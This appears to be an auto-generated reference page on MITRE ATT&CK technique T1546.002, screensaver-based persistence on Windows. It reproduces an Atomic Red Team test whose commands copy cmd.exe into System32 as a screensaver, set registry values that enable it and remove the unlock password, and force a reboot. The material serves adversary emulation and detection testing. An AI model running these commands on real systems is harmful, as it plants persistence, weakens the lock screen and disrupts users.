
# Screensaver

## Description

### MITRE Description

> Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\Windows\System32\</code>, and <code>C:\Windows\sysWOW64\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.

The following screensaver settings are stored in the Registry (<code>HKCU\Control Panel\Desktop\</code>) and could be manipulated to achieve persistence:

* <code>SCRNSAVE.exe</code> - set to malicious PE path
* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver
* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock
* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed

Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug 2017)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1546/002

## Potential Commands

```
copy C:\Windows\System32\cmd.exe "%SystemRoot%\System32\evilscreensaver.scr"
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
shutdown /r /t 0
```

## Commands Dataset

```
[{'command': 'copy C:\\Windows\\System32\\cmd.exe '
             '"%SystemRoot%\\System32\\evilscreensaver.scr"\n'
             'reg.exe add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v '
             'ScreenSaveActive /t REG_SZ /d 1 /f\n'
             'reg.exe add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v '
             'ScreenSaveTimeout /t REG_SZ /d 60 /f\n'
             'reg.exe add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v '
             'ScreenSaverIsSecure /t REG_SZ /d 0 /f\n'
             'reg.exe add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v '
             'SCRNSAVE.EXE /t REG_SZ /d '
             '"%SystemRoot%\\System32\\evilscreensaver.scr" /f\n'
             'shutdown /r /t 0\n',
  'name': None,
  'source': 'atomics/T1546.002/T1546.002.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Event Triggered Execution: Screensaver': {'atomic_tests': [{'auto_generated_guid': '281201e7-de41-4dc9-b73d-f288938cbb64',
                                                                                      'description': 'This '
                                                                                                     'test '
                                                                                                     'copies '
                                                                                                     'a '
                                                                                                     'binary '
                                                                                                     'into '
                                                                                                     'the '
                                                                                                     'Windows '
                                                                                                     'System32 '
                                                                                                     'folder '
                                                                                                     'and '
                                                                                                     'sets '
                                                                                                     'it '
                                                                                                     'as '
                                                                                                     'the '
                                                                                                     'screensaver '
                                                                                                     'so '
                                                                                                     'it '
                                                                                                     'will '
                                                                                                     'execute '
                                                                                                     'for '
                                                                                                     'persistence. '
                                                                                                     'Requires '
                                                                                                     'a '
                                                                                                     'reboot '
                                                                                                     'and '
                                                                                                     'logon.\n',
                                                                                      'executor': {'command': 'copy '
                                                                                                              '#{input_binary} '
                                                                                                              '"%SystemRoot%\\System32\\evilscreensaver.scr"\n'
                                                                                                              'reg.exe '
                                                                                                              'add '
                                                                                                              '"HKEY_CURRENT_USER\\Control '
                                                                                                              'Panel\\Desktop" '
                                                                                                              '/v '
                                                                                                              'ScreenSaveActive '
                                                                                                              '/t '
                                                                                                              'REG_SZ '
                                                                                                              '/d '
                                                                                                              '1 '
                                                                                                              '/f\n'
                                                                                                              'reg.exe '
                                                                                                              'add '
                                                                                                              '"HKEY_CURRENT_USER\\Control '
                                                                                                              'Panel\\Desktop" '
                                                                                                              '/v '
                                                                                                              'ScreenSaveTimeout '
                                                                                                              '/t '
                                                                                                              'REG_SZ '
                                                                                                              '/d '
                                                                                                              '60 '
                                                                                                              '/f\n'
                                                                                                              'reg.exe '
                                                                                                              'add '
                                                                                                              '"HKEY_CURRENT_USER\\Control '
                                                                                                              'Panel\\Desktop" '
                                                                                                              '/v '
                                                                                                              'ScreenSaverIsSecure '
                                                                                                              '/t '
                                                                                                              'REG_SZ '
                                                                                                              '/d '
                                                                                                              '0 '
                                                                                                              '/f\n'
                                                                                                              'reg.exe '
                                                                                                              'add '
                                                                                                              '"HKEY_CURRENT_USER\\Control '
                                                                                                              'Panel\\Desktop" '
                                                                                                              '/v '
                                                                                                              'SCRNSAVE.EXE '
                                                                                                              '/t '
                                                                                                              'REG_SZ '
                                                                                                              '/d '
                                                                                                              '"%SystemRoot%\\System32\\evilscreensaver.scr" '
                                                                                                              '/f\n'
                                                                                                              'shutdown '
                                                                                                              '/r '
                                                                                                              '/t '
                                                                                                              '0\n',
                                                                                                   'elevation_required': True,
                                                                                                   'name': 'command_prompt'},
                                                                                      'input_arguments': {'input_binary': {'default': 'C:\\Windows\\System32\\cmd.exe',
                                                                                                                           'description': 'Executable '
                                                                                                                                          'binary '
                                                                                                                                          'to '
                                                                                                                                          'use '
                                                                                                                                          'in '
                                                                                                                                          'place '
                                                                                                                                          'of '
                                                                                                                                          'screensaver '
                                                                                                                                          'for '
                                                                                                                                          'persistence',
                                                                                                                           'type': 'path'}},
                                                                                      'name': 'Set '
                                                                                              'Arbitrary '
                                                                                              'Binary '
                                                                                              'as '
                                                                                              'Screensaver',
                                                                                      'supported_platforms': ['windows']}],
                                                                    'attack_technique': 'T1546.002',
                                                                    'display_name': 'Event '
                                                                                    'Triggered '
                                                                                    'Execution: '
                                                                                    'Screensaver'}}]
```

# Tactics


* [Persistence](../tactics/Persistence.md)

* [Privilege Escalation](../tactics/Privilege-Escalation.md)
    

# Mitigations


* [Execution Prevention](../mitigations/Execution-Prevention.md)

* [Disable or Remove Feature or Program](../mitigations/Disable-or-Remove-Feature-or-Program.md)
    

# Actors

None
